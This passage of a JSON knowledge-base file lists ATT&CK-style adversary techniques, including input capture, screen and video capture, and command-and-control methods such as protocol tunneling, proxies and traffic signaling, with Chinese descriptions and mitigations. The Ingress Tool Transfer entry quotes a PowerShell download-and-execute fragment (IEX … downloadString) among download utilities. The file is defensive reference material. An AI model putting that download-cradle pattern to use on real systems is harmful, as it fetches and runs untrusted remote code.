                            "content": "在Exchange环境中，管理员可以使用Get-InboxRule来发现和删除潜在的恶意自动转发规则。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "加密的使用为通过电子邮件发送的敏感信息提供了额外的安全层。使用公钥加密的加密要求对手获得私有证书以及解密消息的加密密钥。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "建议对面向公众的网络邮件服务器使用多因素身份验证，以最大限度地减少用户名和密码对对手的有用性。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1056",
        "name": "Input Capture",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            },
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1056.001",
                "name": "Keylogging"
            },
            {
                "id": "T1056.002",
                "name": "GUI Input Capture"
            },
            {
                "id": "T1056.003",
                "name": "Web Portal Capture"
            },
            {
                "id": "T1056.004",
                "name": "Credential API Hooking"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用捕获用户输入的方法来获得证书或收集信息。在正常的系统使用过程中，用户通常会向各种不同的位置提供凭据，例如登录页面/门户或系统对话框。输入捕获机制可能对用户是透明的（例如凭证API挂钩），或者依赖于欺骗用户提供他们认为是真实服务的输入（例如门户捕获）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1113",
        "name": "Screen Capture",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "在操作过程中，敌人可能会试图拍摄桌面的屏幕截图来收集信息。屏幕捕获功能可以作为妥协后操作中使用的远程访问工具的一个功能来包括。通常也可以通过本机实用程序或API调用进行屏幕截图，如＜code＞CopyFromScreen</code＞、＜code＞xwd</code＞或＜code＞截屏</code＞。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1125",
        "name": "Video Capture",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以利用计算机的外围设备（例如，集成摄像头或网络摄像头）或应用程序（例如，视频呼叫服务）来捕捉视频记录，以收集信息。图像也可以从设备或应用程序捕获，可能以指定的间隔来代替视频文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "恶意软件或脚本可用于通过操作系统或应用程序提供的可用API与设备交互以捕获视频或图像。视频或图像文件可以写入磁盘，稍后进行过滤。这种技术与屏幕捕获不同，因为它使用特定的设备或应用程序进行视频录制，而不是捕获受害者的屏幕。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在macOS中，有一些不同的恶意软件样本记录用户的网络摄像头，如FruitFly和Proton。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1071",
        "name": "Application Layer Protocol",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1071.001",
                "name": "Web Protocols"
            },
            {
                "id": "T1071.002",
                "name": "File Transfer Protocols"
            },
            {
                "id": "T1071.003",
                "name": "Mail Protocols"
            },
            {
                "id": "T1071.004",
                "name": "DNS"
            }
        ],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用OSI应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。到远程系统的命令，以及这些命令的结果，将嵌入客户端和服务器之间的协议流量中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用许多不同的协议，包括用于网络浏览、传输文件、电子邮件或DNS的协议。对于在飞地内部发生的连接（例如代理或枢轴节点与其他节点之间的连接），常用的协议是SMB、SSH或RDP。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1092",
        "name": "Communication Through Removable Media",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用可移动介质在可能断开连接的网络上的受损主机之间执行命令和控制，将命令从系统传输到系统。这两个系统都需要受到损害，首先可能是通过可移动介质复制的横向移动，其次可能是通过互联网连接的系统受到损害。命令和文件将从断开连接的系统中继到对手可以直接访问的互联网连接系统。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要，请禁用自动运行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果业务运营不需要可移动媒体，则在组织策略级别上禁止或限制可移动媒体。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1659",
        "name": "Content Injection",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            },
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "攻击者可以通过在线网络流量将恶意内容注入系统，从而获得访问权限并与受害者持续通信。与其引诱受害者使用受损网站上托管的恶意有效载荷（即先按目标驱动，然后按妥协驱动），对手最初可能会通过受损的数据传输渠道访问受害者，在那里他们可以操纵流量和/或注入自己的内容。这些受损的在线网络信道也可以用于向已经受损的系统递送额外的有效载荷（即，入口工具传输）和其他数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式向受害者系统注入内容，包括："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "从中间开始，对手处于合法的在线客户端-服务器通信之间（注意：这与中间的对手类似但不同，后者仅描述企业环境中的AiTM活动）"
                },
                {
                    "type": "list",
                    "content": "从侧面看，恶意内容被注入并作为对合法在线服务器请求的虚假响应与客户端竞争"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "内容注入通常是上游通信渠道受损的结果，例如在互联网服务提供商（ISP）层面，“合法拦截”就是如此"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，确保通过可信VPN等服务对在线流量进行适当加密。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑阻止下载/传输和执行已知在敌方战役中使用的可能不常见的文件类型。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1132",
        "name": "Data Encoding",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1132.001",
                "name": "Standard Encoding"
            },
            {
                "id": "T1132.002",
                "name": "Non-Standard Encoding"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会对数据进行编码，使指挥和控制流量的内容更难检测。可以使用标准数据编码系统对命令和控制（C2）信息进行编码。数据编码的使用可能遵循现有的协议规范，包括ASCII、Unicode、Base64、MIME或其他二进制到文本和字符编码系统的使用。一些数据编码系统也可能导致数据压缩，例如gzip。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定模糊技术，并且可能在各种恶意软件系列和版本中有所不同。敌人可能会随着时间的推移改变工具C2签名，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1001",
        "name": "Data Obfuscation",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1001.001",
                "name": "Junk Data"
            },
            {
                "id": "T1001.002",
                "name": "Steganography"
            },
            {
                "id": "T1001.003",
                "name": "Protocol Impersonation"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会混淆指挥和控制通信，使其更难检测。命令和控制（C2）通信是隐藏的（但不一定是加密的），试图使内容更难发现或解密，并使通信不那么显眼，并隐藏命令不被看到。这包括许多方法，例如向协议流量添加垃圾数据、使用隐写术或模拟合法协议。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的一些混淆活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1568",
        "name": "Dynamic Resolution",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1568.001",
                "name": "Fast Flux DNS"
            },
            {
                "id": "T1568.002",
                "name": "Domain Generation Algorithms"
            },
            {
                "id": "T1568.003",
                "name": "DNS Calculation"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以动态地建立与指挥和控制基础设施的连接，以避免常见的检测和补救。这可以通过使用与对手用来接收恶意软件通信的基础设施共享公共算法的恶意软件来实现。这些计算可以用于动态调整参数，例如恶意软件用于命令和控制的域名、IP地址或端口号。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用动态分辨率来实现后退通道的目的。当与主命令和控制服务器失去联系时，恶意软件可以采用动态解析作为重新建立命令和控制的手段。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。恶意软件研究人员可以对使用动态解析的恶意软件变体进行逆向工程，并确定恶意软件将试图联系的未来C2基础设施，但这是一项时间和资源密集型工作。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在某些情况下，可以使用本地DNS天坑来帮助防止与动态解析相关联的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1573",
        "name": "Encrypted Channel",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1573.001",
                "name": "Symmetric Cryptography"
            },
            {
                "id": "T1573.002",
                "name": "Asymmetric Cryptography"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以采用已知的加密算法来隐藏命令和控制流量，而不是依赖于通信协议提供的任何固有保护。尽管使用了安全算法，但如果在恶意软件样本/配置文件中编码和/或生成密钥，这些实现可能容易受到逆向工程的攻击。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1020",
                "name": "SSL/TLS检查",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "SSL/TLS检查可用于查看加密会话的内容，以查找恶意软件通信协议的基于网络的指示符。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1008",
        "name": "Fallback Channels",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "如果主信道被破坏或无法访问，敌人可以使用后备或备用通信信道，以保持可靠的指挥和控制，并避免数据传输阈值。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定协议，并且可能在各种恶意软件系列和版本中有所不同。敌人可能会随着时间的推移改变工具C2签名，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将工具或其他文件从外部系统转移到受损的环境中。工具或文件可以通过命令和控制通道或通过ftp等替代协议从外部对手控制的系统复制到受害者网络。一旦存在，对手也可能在受损环境中的受害者设备之间转移/散布工具（即横向工具转移）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Windows上，对手可能会使用各种实用程序来下载工具，如"
                },
                {
                    "type": "code",
                    "content": "copy"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "finger"
                },
                {
                    "type": "text",
                    "content": "和certutil，以及PowerShell命令，如"
                },
                {
                    "type": "code",
                    "content": "IEX（New Object Net.WebClient）.downloadString（）"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "Invoke-WebRequest"
                },
                {
                    "type": "text",
                    "content": "。在Linux和macOS系统上，还存在各种实用程序，如"
                },
                {
                    "type": "code",
                    "content": "curl"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "scp"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "sftp"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "wget"
                },
                {
                    "type": "text",
                    "content": "。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可能滥用安装程序和包管理器，如"
                },
                {
                    "type": "code",
                    "content": "yum"
                },
                {
                    "type": "text",
                    "content": "或"
                },
                {
                    "type": "code",
                    "content": "winget"
                },
                {
                    "type": "text",
                    "content": "，将工具下载到受害者主机。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "文件也可以使用各种Web服务以及受害者系统上的本机或其他现有工具进行传输。在某些情况下，对手可能能够利用在基于网络的客户端和本地客户端之间同步的服务，如Dropbox或OneDrive，将文件传输到受害者系统上。例如，通过破坏云帐户并登录服务的门户网站，对手可能能够触发自动同步过程，将文件传输到受害者的机器上。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量或通过已知协议（如FTP）进行的异常数据传输的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定模糊技术，并且可能在各种恶意软件系列和版本中有所不同。敌人可能会随着时间的推移改变工具C2签名，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1104",
        "name": "Multi-Stage Channels",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会为指挥和控制创造多个阶段，这些阶段在不同的条件下或用于某些功能。使用多个阶段可能会混淆命令和控制通道，从而使检测更加困难。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "远程访问工具将调用回第一阶段的命令和控制服务器以获取指示。第一阶段可以具有收集基本主机信息、更新工具和上传附加文件的自动化能力。可以在该点上传第二远程访问工具（RAT）以将主机重定向到第二阶段命令和控制服务器。第二阶段可能会更加全面，并允许对手通过反向外壳和额外的RAT功能与系统交互。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "不同阶段可能会分开进行，没有重叠的基础设施。在原始第一阶段通信路径被发现和阻塞的情况下，加载器还可以具有备份第一阶段回调或回退信道。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1095",
        "name": "Non-Application Layer Protocol",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用OSI非应用层协议在主机和C2服务器之间或在网络内受感染的主机之间进行通信。可能的协议列表非常广泛。具体示例包括网络层协议的使用，例如互联网控制消息协议（ICMP）、传输层协议，例如用户数据报协议（UDP）、会话层协议，诸如套接字安全（SOCKS），以及重定向/隧道化协议，例如LAN上串行（SOL）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "主机之间的ICMP通信就是一个例子。由于ICMP是Internet协议套件的一部分，因此要求由所有IP兼容主机实现。然而，它不像TCP或UDP等其他互联网协议那样经常受到监控，并且可能被对手用来隐藏通信。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "过滤网络流量，以防止使用不必要的跨网络边界的协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "正确配置防火墙和代理，将传出流量限制为仅必要的端口和通过适当的网络网关系统。还要确保主机仅配置为通过授权接口进行通信。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1571",
        "name": "Non-Standard Port",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用通常不相关联的协议和端口配对进行通信。例如，与传统端口443相反，通过端口8088或端口587的HTTPS。对手可能会更改协议使用的标准端口，以绕过网络数据的过滤或混淆分析/解析。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可能对受害者系统进行更改，以滥用非标准端口。例如，注册表项和其他配置设置可用于修改协议和端口配对。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "正确配置防火墙和代理，以将传出流量限制为仅用于该特定网段的必要端口。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1572",
        "name": "Protocol Tunneling",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以在单独的协议内通过隧道将网络通信传送到受害者系统和从受害者系统传送网络通信，以避免检测/网络过滤和/或使得能够访问其他无法访问的系统。隧道技术包括将一个协议显式封装在另一个协议中。这种行为可以通过与现有流量混合来隐藏恶意流量和/或提供外层加密（类似于VPN）。隧道还可以实现对否则将无法到达其预期目的地的网络数据包的路由，例如SMB、RDP或将被网络设备过滤或不在互联网上路由的其他流量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有各种方法可以将一个协议封装在另一个协议中。例如，对手可以执行SSH隧道（也称为SSH端口转发），这涉及通过加密的SSH隧道转发任意数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在动态解析过程中，协议隧道也可能被对手滥用。被称为HTTPS上的DNS（DoH），解析C2基础设施的查询可以封装在加密的HTTPS数据包中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可以利用协议隧道与代理和/或协议模拟相结合来进一步隐藏C2通信和基础设施。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑将网络流量过滤到不受信任或已知的坏域和资源。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1090",
        "name": "Proxy",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1090.001",
                "name": "Internal Proxy"
            },
            {
                "id": "T1090.002",
                "name": "External Proxy"
            },
            {
                "id": "T1090.003",
                "name": "Multi-hop Proxy"
            },
            {
                "id": "T1090.004",
                "name": "Domain Fronting"
            }
        ],
        "version": "3.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用连接代理来引导系统之间的网络流量，或者充当到命令和控制服务器的网络通信的中介，以避免直接连接到其基础设施。存在许多通过代理或端口重定向实现流量重定向的工具，包括HTRAN、ZXProxy和ZXPortMap。敌人使用这些类型的代理来管理指挥和控制通信，减少同时的出站网络连接的数量，在连接丢失时提供弹性，或者在受害者之间现有的可信通信路径上骑行以避免怀疑。敌人可能将多个代理链接在一起，以进一步掩盖恶意流量的来源。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可以利用内容交付网络（CDN）中的路由方案来代理命令和控制流量。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以通过使用网络允许和阻止列表来阻止到已知匿名网络和C2基础设施的流量。应该注意的是，这种阻塞可以通过其他技术（如域前沿技术）来规避。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议内的唯一指示符，并且可能基于特定对手或工具使用的特定C2协议，并且可能在各种恶意软件系列和版本中有所不同。敌人可能会随着时间的推移改变工具C2签名，或者以避免被常见防御工具检测的方式构建协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1020",
                "name": "SSL/TLS检查",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果可以检查HTTPS流量，则可以分析捕获中似乎是面向域的连接。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1219",
        "name": "Remote Access Software",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用合法的桌面支持和远程访问软件来建立到网络内目标系统的交互式指挥和控制通道。这些服务，如"
                },
                {
                    "type": "code",
                    "content": "VNC"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "TeamViewer"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "AnyDesk"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "ScreenConnect"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "LogMein"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "AmmyyAdmin"
                },
                {
                    "type": "text",
                    "content": "以及其他远程监控和管理（RMM）工具，通常用作合法的技术支持软件，并且可以由目标环境中的应用程序控制允许。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以安装远程访问软件，并在妥协后将其用作冗余访问的替代通信信道，或者作为与目标系统建立交互式远程桌面会话的一种方式。它们也可以用作恶意软件的组件，以建立与服务或对手控制的系统的反向连接或反向连接。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会类似地滥用EDR和其他实现远程访问的防御工具中包含的响应功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "许多远程访问软件的安装也可能包括持久性（例如，软件的安装例程创建Windows服务）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用应用程序控制来减少可用于远程访问的未经批准的软件的安装和使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "正确配置防火墙、应用程序防火墙和代理，以限制远程访问软件使用的站点和服务的传出流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名的网络入侵检测和预防系统可能能够防止到远程访问服务的流量。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1205",
        "name": "Traffic Signaling",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1205.001",
                "name": "Port Knocking"
            },
            {
                "id": "T1205.002",
                "name": "Socket Filters"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能使用流量信号来隐藏打开的端口或用于持久性或命令和控制的其他恶意功能。流量信号涉及使用必须发送到系统以触发特殊响应的神奇值或序列，例如打开关闭的端口或执行恶意任务。这可以采取在对手可以用于指挥和控制的端口打开之前发送一系列具有特定特征的数据包的形式。通常，这一系列数据包包括尝试连接到预定义的封闭端口序列（即端口敲击），但可能涉及不寻常的标志、特定字符串或其他独特特征。序列完成后，打开端口可以由基于主机的防火墙完成，但也可以由自定义软件实现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能与已经打开的端口通信，但在该端口上侦听的服务只有在传递了适当的魔法值时才会响应命令或触发其他恶意功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过不同的方法来进行对信号分组的观察以触发通信。最初由Cd00r实现的一种方法是使用libpcap库来探查有问题的数据包。另一种方法利用原始套接字，使恶意软件能够使用已经打开供其他程序使用的端口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用特制的数据包为设备提供的标准服务（如telnet）启用网络设备身份验证。这种信令还可以用于打开诸如telnet之类的封闭服务端口，或者触发对设备上植入的恶意软件的模块修改，添加、删除或改变恶意功能。敌人可能会使用特制的数据包尝试连接到一个或多个（打开或关闭）端口，但也可能尝试连接到同一端口上的路由器接口、广播和网络地址IP，以实现其目标。为了在嵌入式设备上实现这种流量信号，由于体系结构的整体性，对手必须首先实现并利用补丁系统映像。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可以使用局域网唤醒功能来打开关闭电源的系统。局域网唤醒是一种硬件功能，可以通过向断电的系统发送魔法包来打开或唤醒断电的系统。一旦系统打开电源，它可能会成为横向移动的目标。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果环境中不需要，请禁用局域网唤醒。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据该技术的实现方式，可以通过使用有状态防火墙来实现对该技术某些变体的缓解。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1102",
        "name": "Web Service",
        "tactics": [
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1102.001",
                "name": "Dead Drop Resolver"
            },
            {
                "id": "T1102.002",
                "name": "Bidirectional Communication"
            },
            {
                "id": "T1102.003",
                "name": "One-Way Communication"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用现有的合法外部Web服务作为向受损系统中继数据的手段。作为C2机制的流行网站和社交媒体可能会提供大量的掩护，因为网络中的主机可能在妥协之前已经在与它们通信。使用通用服务，如谷歌或推特提供的服务，使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，为对手提供了更高级别的保护。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "使用Web服务还可以保护后端C2基础设施不被恶意软件二进制分析发现，同时还可以实现操作弹性（因为该基础设施可以动态更改）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Web代理可用于强制执行外部网络通信策略，以防止使用未经授权的外部服务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1020",
        "name": "Automated Exfiltration",
